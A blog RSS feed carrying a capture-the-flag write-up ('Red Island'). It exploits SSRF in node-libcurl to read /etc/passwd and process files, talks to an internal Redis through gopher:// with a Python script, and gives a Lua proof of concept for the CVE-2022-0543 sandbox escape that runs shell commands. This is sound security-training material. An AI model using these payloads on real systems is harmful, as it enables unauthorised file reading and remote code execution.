@@ -1,0 +1,328 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Wiloti</title><link>https://wiloti.github.io/post/</link><description>Recent content in Posts on Wiloti</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 06 Jun 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://wiloti.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Red Island</title><link>https://wiloti.github.io/p/red_island/</link><pubDate>Thu, 06 Jun 2024 00:00:00 +0000</pubDate><guid>https://wiloti.github.io/p/red_island/</guid><description>&lt;img src="https://wiloti.github.io/p/red_island/cover.png" alt="Featured image of post Red Island" />&lt;h1 id="tldr">&lt;a href="#tldr" class="header-anchor">&lt;/a>TL;DR
+&lt;/h1>&lt;p>The &lt;code>api/red/generate&lt;/code> endpoint is vulnerable to &lt;strong>SSRF&lt;/strong> attack, where the request is processed by &lt;em>node-libcurl&lt;/em>. This library can be utilize multiple protocols, which come in handy to investigate the current running process.&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>file:///proc/self/cmdline&lt;/code>&lt;/li>
+&lt;li>&lt;code>file:///proc/self/pwd/index.js&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>The implementation of the &lt;em>Redis&lt;/em> service allows for the use of the &lt;code>gopher://&lt;/code> protocol, revealing the version to be &lt;em>5.0.7&lt;/em>, which is vulnerable to the &lt;strong>&lt;a class="link" href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md" target="_blank" rel="noopener"
+>CVE-2022-0543&lt;/a>&lt;/strong>.&lt;/p>
+&lt;h2 id="introduction">&lt;a href="#introduction" class="header-anchor">&lt;/a>Introduction
+&lt;/h2>&lt;h3 id="what-i-learned">&lt;a href="#what-i-learned" class="header-anchor">&lt;/a>What I learned
+&lt;/h3>&lt;ul>
+&lt;li>Basic &lt;strong>SSRF&lt;/strong> with cross-protocol scripting (&lt;code>gopher://&lt;/code> scheme).&lt;/li>
+&lt;li>&lt;em>Redis&lt;/em> interaction with &lt;em>Lua&lt;/em> sandbox escape.&lt;/li>
+&lt;li>First use of &lt;em>Caido&lt;/em> tool.&lt;/li>
+&lt;/ul>
+&lt;h2 id="application-overview">&lt;a href="#application-overview" class="header-anchor">&lt;/a>Application Overview
+&lt;/h2>&lt;p>No source code is provided with this challenge, so I went straight to testing the web application after logging in. I submitted a valid image &lt;em>URL&lt;/em>, which resulted in my sheep looking even more satanic than it already did.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/valid_image_url.png"
+loading="lazy"
+alt="valid image url"
+>&lt;/p>
+&lt;p>There wasn&amp;rsquo;t much more to interact with on application.&lt;/p>
+&lt;h2 id="enumeration">&lt;a href="#enumeration" class="header-anchor">&lt;/a>Enumeration
+&lt;/h2>&lt;p>For the first time I used the &lt;a class="link" href="https://caido.io/" target="_blank" rel="noopener"
+>Caido&lt;/a> tool, which is a promising alternative to &lt;a class="link" href="https://portswigger.net/burp" target="_blank" rel="noopener"
+>Burp Suite&lt;/a>. I sent the request to my &lt;em>Replay&lt;/em> tab and started playing with it.&lt;/p>
+&lt;h3 id="ssrf-with-node-libcurl">&lt;a href="#ssrf-with-node-libcurl" class="header-anchor">&lt;/a>&lt;strong>SSRF&lt;/strong> with node-libcurl
+&lt;/h3>&lt;p>To test if the site was vulnerable to &lt;strong>&lt;a class="link" href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener"
+>Server-Side Request Forgery&lt;/a>&lt;/strong>, I first sent a &lt;em>URL&lt;/em> that was not an image. If the application had processed my request correctly, it should have returned an error message. However, that wasn&amp;rsquo;t quite the case&amp;hellip;&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/valid_url_ssrf.png"
+loading="lazy"
+alt="valid_url_ssrf"
+>&lt;/p>
+&lt;p>I received an error, but it included the response body of the requested link.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/SSRF_Diagram.png"
+loading="lazy"
+alt="SSRF Diagram"
+>&lt;/p>
+&lt;p>This diagram summarizes what happens behind the scenes during a basic &lt;strong>SSRF&lt;/strong> attack. The input is always trusted and returned. If such user input is enabled, the error handling and input validation should be strengthened to allow only certain domains and return appropriate error messages.&lt;/p>
+&lt;p>To learn more about how the request was processed on the server side, I used &lt;a class="link" href="https://app.interactsh.com/#/" target="_blank" rel="noopener"
+>interactsh&lt;/a> to identify the library in use.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-HTTP" data-lang="HTTP">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">*/*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">node-libcurl/2.3.4&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The library used is &lt;a class="link" href="https://www.npmjs.com/package/node-libcurl" target="_blank" rel="noopener"
+>node-libcurl&lt;/a>, which supports a wide range of protocols.&lt;/p>
+&lt;blockquote>
+&lt;p>libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!&lt;/p>
+&lt;ul>
+&lt;li>&lt;cite> Official description of the &lt;em>node-libcurl&lt;/em> library&lt;/cite>&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;p>With this knowledge, I attempted to read a local file using the &lt;code>file://&lt;/code> scheme.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/poc_reading_file_with_ssrf.png"
+loading="lazy"
+alt="reading /etc/passwd"
+>&lt;/p>
+&lt;h3 id="redis-and-the-goofy-gophers">&lt;a href="#redis-and-the-goofy-gophers" class="header-anchor">&lt;/a>&lt;em>Redis&lt;/em> and the goofy gophers
+&lt;/h3>&lt;p>To learn more about the web application currently running, I read the &lt;code>/proc/self/cmdline&lt;/code> file, which contains the command used to start the app.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/reading_current_process.png"
+loading="lazy"
+alt="current process running"
+>&lt;/p>
+&lt;p>Next, I viewed the content of the &lt;code>index.js&lt;/code> file located in &lt;code>/proc/self/cwd/index.js&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/reading_content_current_process.png"
+loading="lazy"
+alt="current process running"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">express&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;express&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">app&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="nx">express&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">session&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;express-session&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">RedisStore&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;connect-redis&amp;#34;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;path&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">cookieParser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;cookie-parser&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">nunjucks&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;nunjucks&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">routes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./routes&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">Database&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./database&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">createClient&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;redis&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">redisClient&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="nx">createClient&lt;/span>&lt;span class="p">({&lt;/span> &lt;span class="nx">legacyMode&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Database&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/tmp/redisland.db&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">express&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cookieParser&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">redisClient&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">connect&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">SNIP&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;a class="link" href="https://redis.io/" target="_blank" rel="noopener"
+>Redis&lt;/a> or &lt;strong>RE&lt;/strong>mote &lt;strong>DI&lt;/strong>ctionary &lt;strong>S&lt;/strong>erver is a popular service for caching data in memory.&lt;/p>
+&lt;p>In this application, &lt;em>Redis&lt;/em> is used for &lt;em>session storage&lt;/em> with &lt;code>redisClient.connect()&lt;/code>. With no options provided, I assumed it was connected to the local address &lt;code>localhost:6379&lt;/code>.&lt;/p>
+&lt;p>I am aware that &lt;em>Redis&lt;/em> implements &lt;a class="link" href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" target="_blank" rel="noopener"
+>gopher&lt;/a>, which was an alternative to the &lt;a class="link" href="https://en.wikipedia.org/wiki/World_Wide_Web" target="_blank" rel="noopener"
+>World Wide Web&lt;/a> in the late 90&amp;rsquo;s.&lt;/p>
+&lt;p>Given that &lt;em>node-libcurl&lt;/em> supports multiple protocols for &lt;strong>SSRF&lt;/strong>, and &lt;em>gopher&lt;/em> can be used to communicate with the &lt;em>Redis&lt;/em> client, I performed a &lt;strong>Cross-Protocol Scripting&lt;/strong> attack using the &lt;code>gopher://&lt;/code> scheme.&lt;/p>
+&lt;p>&lt;img src="https://wiloti.github.io/red_island/screenshots/uri_gopher.png"
+loading="lazy"
+alt="URI"
+>&lt;/p>
+&lt;p>To automate this, I wrote a python script:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">urllib.parse&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">quote&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;lt;TARGET:HOST&amp;gt;/api/red/generate&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">INFO
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">quit
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;gopher://localhost:6379/_&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;application/json&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;connect.sid=&amp;lt;SESSION_COOKIE&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">r&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I submitted this payload to gather more information on the current &lt;em>Redis&lt;/em> instance.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-prolog" data-lang="prolog">&lt;span class="line">&lt;span class="cl">&lt;span class="s">#&lt;/span> &lt;span class="nv">Server&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">redis_version:&lt;/span>&lt;span class="mf">5.0.7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">redis_git_sha1:&lt;/span>&lt;span class="mi">00000000&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">redis_git_dirty:&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">redis_build_id:&lt;/span>&lt;span class="mi">636&lt;/span>&lt;span class="s">cde3b5c7a3923&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">redis_mode:standalone&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nn">os&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nv">Linux&lt;/span> &lt;span class="mf">6.1.0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="s">amd64&lt;/span> &lt;span class="s">x86_64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">arch_bits:&lt;/span>&lt;span class="mi">64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nv">SNIP&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>A search for vulnerabilities in this specific version of &lt;em>Redis&lt;/em> (5.0.7) led me to &lt;a class="link" href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md" target="_blank" rel="noopener"
+>CVE-2022-0543&lt;/a>, discovered by &lt;a class="link" href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce" target="_blank" rel="noopener"
+>Reginaldo Silva&lt;/a>.&lt;/p>
+&lt;h2 id="exploitation">&lt;a href="#exploitation" class="header-anchor">&lt;/a>Exploitation
+&lt;/h2>&lt;h3 id="why">&lt;a href="#why" class="header-anchor">&lt;/a>Why?
+&lt;/h3>&lt;p>This vulnerability does not originate directly from &lt;em>Redis&lt;/em>. On specific distributions, &lt;em>Lua&lt;/em> is loaded dynamically, which allowed me to perform a &lt;strong>Remote Code Execution&lt;/strong> on the host by escaping the &lt;em>Lua&lt;/em> sandbox.&lt;/p>
+&lt;blockquote>
+&lt;p>This vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.&lt;/p>
+&lt;ul>
+&lt;li>&lt;cite>Vulhub GitHub: &lt;em>Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)&lt;/em>&lt;/cite>&lt;/li>
+&lt;/ul>
+&lt;/blockquote>
+&lt;h3 id="poc">&lt;a href="#poc" class="header-anchor">&lt;/a>PoC
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- loading &amp;#34;luaopen_io&amp;#34; module from the library to execute a command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">local&lt;/span> &lt;span class="n">io_l&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">package.loadlib&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;luaopen_io&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">local&lt;/span> &lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">io_l&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- executing the command &amp;#39;id&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">local&lt;/span> &lt;span class="n">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">io.popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;id&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- reading and returning the output of the command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">local&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;*a&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">return&lt;/span> &lt;span class="n">res&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
